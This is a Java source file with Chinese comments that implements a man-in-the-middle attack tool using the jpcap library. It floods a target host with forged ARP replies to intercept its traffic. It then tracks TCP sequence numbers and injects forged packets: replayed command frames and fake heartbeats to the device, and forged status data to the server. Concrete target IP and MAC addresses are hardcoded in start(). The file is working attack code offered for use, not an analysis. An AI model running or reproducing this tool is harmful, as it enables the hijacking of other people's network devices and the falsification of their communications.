package Manager;


import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import java.util.Properties;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.BrokenBarrierException;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.CyclicBarrier;

import org.omg.CORBA.PUBLIC_MEMBER;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;
import Factory.ARPFactory;
import Model.Model_Capture;
import Model.Model_a;
import Model.TestPacketReceiver;
import Util.DealPcap.wireless802_airdump1;
import Util.SetPacket.SetARP;
import Util.SetPacket.SetTCP;

public class Manager_cheatServiceAndHost_2 {
	
	

	final BlockingQueue<Packet> sendQueue = new ArrayBlockingQueue<Packet>(10);
	static Object flag = new Object(); 
	
	//接收抓取的上行数据包，每次抓取到都会更改
	CopyOnWriteArrayList<Packet> pakage_up = new CopyOnWriteArrayList<Packet>();
	
	//接收抓取的上行数据包，每次抓取到都会更改
	CopyOnWriteArrayList<Packet> pakage_down = new CopyOnWriteArrayList<Packet>();
	
	//双线程阻塞工具类
	final  CyclicBarrier cb = new CyclicBarrier(2);
	
	//反制数据队列
	List<Model_a> counter_data_list = new ArrayList<Model_a>();
	
	//暂时未使用
	//反制数据队列(心跳)
	List<Model_a> counter_heart_list_toHost = new ArrayList<Model_a>();
	List<Model_a> counter_heart_list_toService = new ArrayList<Model_a>();
	
	//伪造状态数据
	List<Model_a> fake_status_list_toService = new ArrayList<Model_a>();
	
	//配置文件
	static int ARP_INTERVAL;
	static int NETCARD_INDEX;
	
	static String HOST_IP;
	static String SERVICE_IP;
	static String ROUTE_IP;
	
	static String YOUR_DEVICE_MAC;
	static String TARGET_HOST_MAC;
	static String TARGET_ROUTE_MAC;
	
	static String COUNTER_DATASOURCE;
	static int[] INT_INDEX;
	static int[] HEART_INDEX_UP;
	static int[] HEART_INDEX_DOWN;
	
	static int[] STATUS_INDEX_TOSERVICE;
	
	{
		readProperties();
		
	}
	
	
	
	/*************************************************
	 * 主函数，测试使用
	 *************************************************/	
	public static void main(String[] args) {
		
		Manager_cheatServiceAndHost_2 mc= new Manager_cheatServiceAndHost_2();
		
		JpcapSender js = getCrad(NETCARD_INDEX);
		
		//获取发送数据包的网卡
		
		/*************************************************
		 * 从抓取的数据包获得反制数据队列
		 *************************************************/
		mc.recognazion_command(COUNTER_DATASOURCE,INT_INDEX,HEART_INDEX_UP,HEART_INDEX_DOWN);
		
		/*************************************************
		 * 伪造ARP数据，添加到待发送列表中
		 *************************************************/                                                       
		mc.setARPs(HOST_IP,ROUTE_IP,YOUR_DEVICE_MAC,TARGET_HOST_MAC,null);
		
		
		/************************************************* 
		 * 启动发包线程，检查发包列表，需要不停的发送
		 *************************************************/
		mc.sentThread(js);
		
		/*************************************************
		 * ARP欺骗成功后，开始捕获主机发送的数据放入到cpmodel中,
		 * 并且计算出伪造数据加入到发送列表
		 *************************************************/
		mc.capPacket_run(NETCARD_INDEX,HOST_IP,SERVICE_IP,YOUR_DEVICE_MAC);
		
		
		/*************************************************
		 * 选择模式，进入伪造线程，开始伪造数据,并添加到待发送列表
		 * 模式一：只转发数据
		 * 模式二：拦截主机和服务器的数据，并且发送伪造与主机的通信
		 *************************************************/
		mc.fakeThread(2,YOUR_DEVICE_MAC,TARGET_HOST_MAC,TARGET_ROUTE_MAC);
		
	}
	
	
	/*************************************************
	 * 启动函数,为其他类调用时提供接口
	 *************************************************/
	public void start(){
		
		//获取发送数据包的网卡
				JpcapSender js = getCrad(0);
				
				/*************************************************
				 * 从抓取的数据包获得反制数据队列
				 *************************************************/
				recognazion_command(COUNTER_DATASOURCE,INT_INDEX,HEART_INDEX_UP,HEART_INDEX_DOWN);
				
				/*************************************************
				 * 伪造ARP数据，添加到待发送列表中
				 *************************************************/
				setARPs("192.168.1.100","192.168.8.1","60:d8:19:4a:b2:fc","AC:CF:23:87:BD:2E","E4:D3:32:E0:7B:82");
				
				
				/************************************************* 
				 * 启动发包线程，检查发包列表，需要不停的发送
				 *************************************************/
				sentThread(js);
				
				/*************************************************
				 * ARP欺骗成功后，开始捕获主机发送的数据放入到cpmodel中,
				 * 并且计算出伪造数据加入到发送列表
				 *************************************************/
				capPacket_run(0,"192.168.8.100","119.29.42.117","60:d8:19:4a:b2:fc");
				
				/*************************************************
				 * 选择模式，进入伪造线程，开始伪造数据,并添加到待发送列表
				 * 模式一：只转发数据
				 * 模式二：拦截主机和服务器的数据，并且发送伪造与主机的通信
				 *************************************************/
				fakeThread(2,"60:d8:19:4a:b2:fc","AC:CF:23:87:BD:2E",TARGET_ROUTE_MAC);	
	}
	
	
	/*************************************************
	 * end
	 *************************************************/
	
	
	/*************************************************
	 * 从抓取的数据包中识别出反制数据队列
	 *************************************************/
	public void recognazion_command(final String path,final int[] int_index,final int[] heart_index_up,final int[] heart_index_down){
		Runnable run = new Runnable() {
			
			@Override
			public void run() {
				
				//还需要识别一个正常情况下服务与主机的心跳数据，可以完整的与主机通信
				wireless802_airdump1 w = new wireless802_airdump1();
				List<Model_a> ls = w.ergodic(path);
				counter_data_list = w.getFrameByindex(int_index,ls);
				
				if(counter_data_list.size() != 0){
					System.out.println("分析成功！生成反制数据队列........");
					System.out.println("length:"+counter_data_list.size());
				}else {
					System.out.println("反制队列获取失败");
				}
				
				if(heart_index_up.length != 0){
					counter_heart_list_toService = w.getFrameByindex(heart_index_up, ls);	
					if(counter_heart_list_toService.size() != 0){
						System.out.println("分析成功！生成伪造心跳数据toService........");
						System.out.println("length:"+counter_heart_list_toService.size());
					}
				}else {
					System.out.println("未启用完整反制模式，心跳数据toService未启用");
				}
				
				if(heart_index_down.length != 0){
					counter_heart_list_toHost = w.getFrameByindex(heart_index_down, ls);	
					if(counter_heart_list_toHost.size() != 0){
						System.out.println("分析成功！生成伪造心跳数据toHost........");
						System.out.println("length:"+counter_heart_list_toHost.size());
					}
				}else {
					System.out.println("未启用完整反制模式，心跳数据toHost未启用");
				}
				
				
				if(STATUS_INDEX_TOSERVICE.length != 0){
					fake_status_list_toService = w.getFrameByindex(STATUS_INDEX_TOSERVICE, ls);	
					if(fake_status_list_toService.size() != 0){
						System.out.println("分析成功！生成伪造状态数据toService........");
						System.out.println("length:"+fake_status_list_toService.size());
					}
				}
				
					try {
						cb.await();
					} catch (InterruptedException | BrokenBarrierException e){
						e.printStackTrace();
					}
			}
		};
		
		System.out.println("开始创建反制队列");
		new Thread(run).start();
	}
	/*************************************************
	 * end
	 *************************************************/
	
	
	/*************************************************
	 * 抓包线程第一个参数是网卡序号，后面是主机IP和服务器IP
	 *************************************************/
	public  void capPacket_run(int i,final String host_ip, final String service_ip ,final String yourMAC){
	    
	       try{    
	            //获取本机上的网络接口对象数组    
	     final  NetworkInterface[] devices = JpcapCaptor.getDeviceList();    
	            
	        NetworkInterface nc=devices[i];    
	        //创建某个卡口上的抓取对象,设置最大一次性抓包大小为2000byte
	        final JpcapCaptor jpcap = JpcapCaptor.openDevice(nc, 2000, true, 20); 
	        jpcap.setFilter("ip and tcp", true);
	        
	         Runnable run = new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					System.out.println("启动抓包线程");
					//是否每一次需要不同的Pr
					TestPacketReceiver pr = new TestPacketReceiver(host_ip,yourMAC);
					while(true){
						startCapThread(jpcap,host_ip,service_ip,pr);
					}	
				}
			};
			
			new Thread(run).start();
	            
	        System.out.println("准备获取第"+i+"个卡口上的数据");    
  
	        }catch(Exception ef){    
	            ef.printStackTrace();    
	            System.out.println("启动失败:  "+ef);    
	        }      
	   }
	    //将Captor放到独立线程中运行    
	   public  void startCapThread(final JpcapCaptor jpcap,final String host_ip,final String service_ip,TestPacketReceiver pr){    
	       //JpcapCaptor jp=jpcap;    
    	  // while(true){}    
  		 //使用接包处理器循环抓包-1表示无限制的抓取数据包   "192.168.8.101","119.29.42.117"
  		  jpcap.loopPacket(1, pr);
  		  
  		  if(pr.getPacket() != null){

  			  Packet packet = pr.getPacket();
  			  //TCP帧 
  			  if(packet instanceof jpcap.packet.TCPPacket){
  				  TCPPacket tcpPacket = (TCPPacket)packet;
  				  
  				  if(tcpPacket.syn){
  					  
  					  System.out.println("握手帧......更新cpmodel失败");
  					  	
  				  }
  				  //&&service_ip.equals(tcpPacket.dst_ip.getHostAddress())
  				//上行数据
  				  else if(host_ip.equals(tcpPacket.src_ip.getHostAddress())){
  					  if(pakage_up.size() == 0){
  						
  						 pakage_up.add(tcpPacket);
  						 System.out.println("上行数据");
  						 System.out.println("packet_up初始化成功");
  					  }
  					  else{
  						  TCPPacket packet2 = (TCPPacket) pakage_up.get(0);
  						  if(packet2.ack_num == tcpPacket.ack_num&&packet2.sequence == tcpPacket.sequence&&packet2.data.length==tcpPacket.data.length){
  							
  							 // System.out.println("重复帧，未更新packet_up");
  						  }else{
  							  
  							  pakage_up.set(0, tcpPacket);
  							  System.out.println("上行数据");
  							  System.out.println("新数据，更新packet_up");
  						  }
  						  
  					  }
  					  
  				  }
  				  //&&service_ip.equals(tcpPacket.src_ip.getHostAddress())
  				//下行行数据
  				  else if(host_ip.equals(tcpPacket.dst_ip.getHostAddress())){
  					  if(pakage_down.size() == 0){
  						  pakage_down.add(tcpPacket);
  						 System.out.println("下行数据");
  						  System.out.println("packet_down初始化");
  					  }
  					  else{
  						  TCPPacket packet2 = (TCPPacket) pakage_down.get(0); 
  						  if(packet2.ack_num == tcpPacket.ack_num&&packet2.sequence == tcpPacket.sequence&&packet2.data.length==tcpPacket.data.length){
  							  
  							  //System.out.println("重复帧，未更新packet_down");
  						  }else{
  							  pakage_down.set(0, tcpPacket);
  							 System.out.println("下行数据");
  							  System.out.println("新数据，更新packet_down");
  						  }	  
  					  }
  				  }
  			  }	  
  			  
  		  }  
  	   
       
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	   
	 /*************************************************
	 * 发包线程
	 *************************************************/
	   public void sentThread(final JpcapSender js){
		   
		   java.lang.Runnable runner = new Runnable(){

				@Override
				public void run() {
					
					try {
						//不停的发包
						while(true){
							if(js != null){
									
								Packet packet = sendQueue.take();
								if(packet instanceof jpcap.packet.ARPPacket){
									
									System.out.println("sending arp.."); 
									
								}
								if(packet instanceof jpcap.packet.TCPPacket){
									
									TCPPacket tcpPacket = (TCPPacket)packet;
									System.out.println("sending TCPtohost.."+"seq|"+tcpPacket.sequence+
														" ack|"+tcpPacket.ack_num);
								}
								
								js.sendPacket(packet);
							}
							
						}
					} catch (Exception e) {
						System.out.println("发送数据线程出错");
						e.printStackTrace();
					}
				}
				
			};
			
			Thread senThread = new Thread(runner);
			senThread.start();
			//new Thread(runner).start();
		   System.out.println("发包线程启动");
		   
	   } 
	 /*************************************************
	 * end
	 *************************************************/
	   
	 /*************************************************
	 * ARPs设置
	 *************************************************/
	   public  void setARPs(String hostIP,String routeIP,String yourMAC,String deviceMAC,String routeMAC){
		  
		   ARPFactory arpFactory = null;
		   if(routeMAC == null){
			   arpFactory = new ARPFactory(hostIP, routeIP, yourMAC, deviceMAC);
		   }else{
			   
			   arpFactory = new ARPFactory(hostIP, routeIP, yourMAC, deviceMAC, routeMAC);
		   }
		  
		   final ARPFactory arpFactory1 = arpFactory;
		  Runnable run = new Runnable() {
			
			@Override
			public void run() {
				Set<ARPPacket> ARPs = null;
				Iterator<ARPPacket> it = null;
				while(true){
					ARPs = arpFactory1.getInstance();
					it = ARPs.iterator();
					//把arp加入发送队列
					while(it.hasNext()){
						try {
							sendQueue.put(it.next());
						} catch (InterruptedException e) {
							e.printStackTrace();
						}	
					}
					//每生产一次停止指定的时间ARP_INTERVAL
					try {
						Thread.sleep(ARP_INTERVAL);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
		  };
		  
		  
		  new Thread(run).start();
		  
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	   
	  /*************************************************
	 * 伪造数据包线程,分为多种模式
	 *************************************************/
	  public  void fakeThread(int flags,final String  yourMAC,final String hostMAC,final String rounteMAC){
		   
		   //模式一为直接转发接收到的数据

		   //模式2为拦截对方数据,转发自己伪造的数据
		    //if(flag == 2){
			   java.lang.Runnable runner = new  Runnable() {
				   public void run() {
					  // System.out.println("进入到伪造线程1");
					  // int step = 0;
					   try {
							  //等待反制队列创建成功
							cb.await();
						} catch (InterruptedException | BrokenBarrierException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					   
					   Packet packet_up = null;
					   Packet packet_down = null;
					   
					  while(true){	
						  	//与主机设备的反制通信
						  if(pakage_up.size() != 0){/*
							  if(pakage_up.get(0) instanceof TCPPacket){
								  if(packet_up == null){
									  	//处理TCP数据
										  packet_up = pakage_up.get(0);
										  //执行伪造数据
										  TCPPacket fakeTCP = fakeTCP(yourMAC,hostMAC,step,(TCPPacket)packet_up,rounteMAC);
										  if(fakeTCP != null){
											  step++;
											  try {
													sendQueue.put(fakeTCP);
													System.out.println("加入发送队列......");
												} catch (InterruptedException e) {
													// TODO Auto-generated catch block
													e.printStackTrace();
												}
										  }
										  
									  }else {
										  	//先从同步集合中提取paket比较如果和packet_up不同，执行伪造数据，否则无操作
										  TCPPacket packet1 = (TCPPacket)packet_up;
										  TCPPacket packet2 = (TCPPacket)pakage_up.get(0);
										  
										  if(packet1.ack_num != packet2.ack_num || packet1.sequence != packet2.sequence || packet1.data.length!=packet2.data.length){
											  packet_up = pakage_up.get(0);
											  TCPPacket fakeTCP = fakeTCP(yourMAC,hostMAC,step,(TCPPacket)packet_up,rounteMAC);
											  if(fakeTCP != null){
												  step++;
												  try {
														sendQueue.put(fakeTCP);
														System.out.println("up加入发送队列......");
													} catch (InterruptedException e) {
														// TODO Auto-generated catch block
														e.printStackTrace();
													}
												  
											  }
										  }
									  }
							  }*/
							  	
							  ////////////
							  fake(packet_up, pakage_up, yourMAC, hostMAC, rounteMAC);
							  
						  }
 
						  //与服务其的反制通信
						  if(pakage_down.size() != 0){
							 /* if(pakage_down.get(0) instanceof TCPPacket){
								  if(packet_down == null){
									  	//处理TCP数据
										  packet_down = pakage_down.get(0);
										  //执行伪造数据
										  TCPPacket fakeTCP = fakeTCP(yourMAC,hostMAC,step,(TCPPacket)packet_down,rounteMAC);
										  if(fakeTCP != null){
											  step++;
											  try {
													sendQueue.put(fakeTCP);
													System.out.println("加入发送队列......");
												} catch (InterruptedException e) {
													// TODO Auto-generated catch block
													e.printStackTrace();
												}
										  }
										  
									  }else {
										  	//先从同步集合中提取paket比较如果和packet_up不同，执行伪造数据，否则无操作
										  TCPPacket packet1 = (TCPPacket)packet_down;
										  TCPPacket packet2 = (TCPPacket)pakage_down.get(0);
										  
										  if(packet1.ack_num != packet2.ack_num || packet1.sequence != packet2.sequence || packet1.data.length!=packet2.data.length){
											  packet_down = pakage_down.get(0);
											  TCPPacket fakeTCP = fakeTCP(yourMAC,hostMAC,step,(TCPPacket)packet_down,rounteMAC);
											  if(fakeTCP != null){
												  try {
														sendQueue.put(fakeTCP);
														System.out.println("down加入发送队列......");
													} catch (InterruptedException e) {
														// TODO Auto-generated catch block
														e.printStackTrace();
													}
												  
											  }
										  }
									  }
							  }
							  */
							  
							  ///////////////
							  fake(packet_down, pakage_down, yourMAC, hostMAC, rounteMAC);
						  }
					 }
				   }
			   };  
			   
			   Thread fakeThread = new Thread(runner);
			   fakeThread.start();
		   //}
		    
	   }
	   /*************************************************
	   * end
	   *************************************************/
	  
	 public void fake(Packet oldpacket,CopyOnWriteArrayList<Packet> packets,String  yourMAC,String hostMAC,String rounteMAC){
		 

		  if(packets.get(0) instanceof TCPPacket){
			  if(oldpacket == null){
				  	  //处理TCP数据
				  	  oldpacket = packets.get(0);
					  //执行伪造数据
					  TCPPacket fakeTCP = fakeTCP(yourMAC,hostMAC,0,(TCPPacket)oldpacket,rounteMAC);
					  if(fakeTCP != null){  
						  try {
								sendQueue.put(fakeTCP);
								System.out.println("加入发送队列......");
							} catch (InterruptedException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
					  }
					  
				  }else {
					  	//先从同步集合中提取paket比较如果和packet_up不同，执行伪造数据，否则无操作
					  TCPPacket packet1 = (TCPPacket)oldpacket;
					  TCPPacket packet2 = (TCPPacket)packets.get(0);
					  
					  if(packet1.ack_num != packet2.ack_num || packet1.sequence != packet2.sequence || packet1.data.length!=packet2.data.length){
						  oldpacket = packets.get(0);
						  TCPPacket fakeTCP = fakeTCP(yourMAC,hostMAC,0,(TCPPacket)oldpacket,rounteMAC);
						  if(fakeTCP != null){
							  try {
									sendQueue.put(fakeTCP);
									System.out.println("加入发送队列......");
								} catch (InterruptedException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
							  
						  }
					  }
				  }
		  }
		  		 
	 }
	  
	   
	   /*************************************************
	 * 用来伪造计算要发送的TCP帧
	 *************************************************/
	   public  TCPPacket fakeTCP(String  yourMAC,String hostMAC,int step,TCPPacket tcpPacket,String routeMAC){
		   
		   SetTCP st = new SetTCP();
		   TCPPacket tcp = null;
		   //int total = counter_data_list.size();
		   
		 
		   //我门要伪造的数据是伪造为服务器发给主机的
		   //先计算出seq ack
		   
		   long seq = 0;
		   long ack = 0;
		   
		   if(tcpPacket.syn){
			   
			   //SYN握手帧
			   
		   }
		   else if(tcpPacket.ack && !tcpPacket.psh){

				   seq = tcpPacket.ack_num;
				   ack = tcpPacket.sequence;       
				   
		   }
		   else if(tcpPacket.ack && tcpPacket.psh){
			   
			   
			   //计算SEQ和ACK
			   seq = tcpPacket.ack_num;
			   ack = tcpPacket.sequence + tcpPacket.data.length;	  
		 }   
		   
		   //tcpPacket.dst_ip.getHostAddress().equals(SERVICE_IP)&&
		   if(tcpPacket.src_ip.getHostAddress().equals(HOST_IP)){
			   
			   if(seq != 0){
				   
				   //int index = step;
				   if(counter_data_list.size()>0){
					   
					   System.out.println("伪造发往设备主机的数据中.....");
					   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
				    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
				    			 yourMAC, hostMAC, counter_data_list.get(0));
					   //
					   counter_data_list.remove(0);
					   
		System.out.println("伪造数据成功   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length); 
					    
				   }
				   else {	   
					   //当发送完成反制队列的数据后，如果主机回复包含数据，才继续伪造ACK回复，否则不回复
					   if(tcpPacket.data.length != 0){ 
						   if(counter_heart_list_toHost.size() != 0&&tcpPacket.data.length<305){
							   System.out.println("伪造发往设备主机的数据中.....");
							   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
						    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
						    			 yourMAC, hostMAC, counter_heart_list_toHost.get(0));
							  
				System.out.println("伪造数据成功   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length); 
						   }else{
							   System.out.println("伪造发往设备主机的数据中.....");
							   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
						    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
						    			 yourMAC, hostMAC, null);
				System.out.println("伪造数据成功   seq|"+tcp.sequence+" ack|"+tcp.ack_num+" ack|"+tcp.ack); 		   
						   }
						   
					   }   
				   }
				  	   
			   }   
		   }else if(tcpPacket.dst_ip.getHostAddress().equals(HOST_IP)){
			  
			   		if(tcpPacket.data.length >= 67 && fake_status_list_toService.size()!=0){
			   			
			   		 System.out.println("伪造状态数据发往服务器的数据中.....");
					   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
				    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
				    			 yourMAC, routeMAC, fake_status_list_toService.get(0));
					   System.out.println("伪造数据成功   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length);
			   		}
			   		else if(counter_heart_list_toService.size() != 0){
			   			
					   System.out.println("伪造发往服务器的数据中.....");
					   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
				    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
				    			 yourMAC, routeMAC, counter_heart_list_toService.get(0));
					   System.out.println("伪造数据成功   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length);
					   
				   }else {
					   
					   System.out.println("伪造发往服务器的数据中.....");
					   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
				    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
				    			 yourMAC, routeMAC, null);
					   System.out.println("伪造数据成功   seq|"+tcp.sequence+" ack|"+tcp.ack_num+" ack|"+tcp.ack);
				}
		   }
		  return tcp; 
	   } 
	   
	   /*************************************************
	 * end
	 *************************************************/


		
		 /*************************************************
			 * 获取用来发送数据的网卡
			 *************************************************/
		public static JpcapSender getCrad(int deviceNum){
				  
					NetworkInterface[] devices = null;
					 try{    
						 //获取本机上的网络接口对象数组    
						  devices = JpcapCaptor.getDeviceList();
		System.out.println("网卡获取成功  ");  
						 }catch(Exception ef){    
						            ef.printStackTrace();    
			System.out.println("显示网络接口数据失败:  "+ef);    
						    }  
					 
					JpcapSender js = null;
					
					try {
						js = JpcapSender.openDevice(devices[deviceNum]);
		System.out.println("已获取网卡(发送使用)  "+deviceNum+"  JSender建立成功");  				
					} catch (IOException e1) {
			System.out.println("JSender建立不成功");
						e1.printStackTrace();
					}
					  
				  return js;
			  } 
			  /*************************************************
			 * end
			 *************************************************/
		
		
		
		
		/*************************************************
		 * 读取配置文件prameter.properties
		 *************************************************/
		  public void readProperties(){
			  	
				Properties prop = new Properties();
				InputStream in = Object. class .getResourceAsStream( "/counterProperties.properties" );    
		        try  {    
		           prop.load(in);    
		 
		           ARP_INTERVAL = Integer.parseInt(prop.getProperty( "ARP_INTERVAL" ).trim()); 
		           NETCARD_INDEX = Integer.parseInt(prop.getProperty( "NETCARD_INDEX" ).trim());
		           HOST_IP = prop.getProperty( "HOST_IP" ).trim();
		           if(!prop.getProperty( "SERVICE_IP" ).trim().equals("")){
		        	   SERVICE_IP = prop.getProperty( "SERVICE_IP" ).trim();  
		           }else {
		        	   SERVICE_IP = null;
				}
		           
		           ROUTE_IP = prop.getProperty( "ROUTE_IP" ).trim();
		           YOUR_DEVICE_MAC = prop.getProperty( "YOUR_DEVICE_MAC" ).trim();
		           TARGET_HOST_MAC = prop.getProperty( "TARGET_HOST_MAC" ).trim();
		           TARGET_ROUTE_MAC = prop.getProperty( "TARGET_ROUTE_MAC" ).trim();
		           COUNTER_DATASOURCE =  prop.getProperty( "COUNTER_DATASOURCE" ).trim();
		           
		           String[] ss1  =  prop.getProperty( "INT_INDEX" ).trim().split(",");
		           if(ss1.length != 0){ 
		        	   INT_INDEX = new int[ss1.length];
		        	   for(int i = 0;i<ss1.length;i++){  
			        	   INT_INDEX[i] = Integer.parseInt(ss1[i]);
			           } 
		           }
		           
		           String[] ss2 =  prop.getProperty( "HEART_INDEX_UP" ).trim().split(",");
		           if(!ss2[0].equals("")){ 
		        	   HEART_INDEX_UP = new int[ss2.length];
		        	   for(int i = 0;i<ss2.length;i++){  
		        		   HEART_INDEX_UP[i] = Integer.parseInt(ss2[i]);
			           } 
		           }
		           
		           String[] ss3 =  prop.getProperty( "HEART_INDEX_DOWN" ).trim().split(",");
		      
		           if(!ss3[0].equals("")){ 
		        	   HEART_INDEX_DOWN = new int[ss3.length];
		        	   for(int i = 0;i<ss3.length;i++){  
		        		   HEART_INDEX_DOWN[i] = Integer.parseInt(ss3[i]);
			           } 
		           }
		           
		           
		           String[] ss4 =  prop.getProperty( "STATUS_INDEX_TOSERVICE" ).trim().split(",");
				      
		           if(!ss4[0].equals("")){ 
		        	   STATUS_INDEX_TOSERVICE = new int[ss4.length];
		        	   for(int i = 0;i<ss4.length;i++){  
		        		   STATUS_INDEX_TOSERVICE[i] = Integer.parseInt(ss4[i]);
			           } 
		           }
		           
		       }  catch  (IOException e) {    
		           e.printStackTrace();    
		       }  
		         
		        
		        /*
		        File fileB = new File( this.getClass().getResource( "" ).getPath());  
		        
		        System. out .println( "fileB path: " + fileB);*/  
		  }
		  /*************************************************
		 * end
		 *************************************************/
}    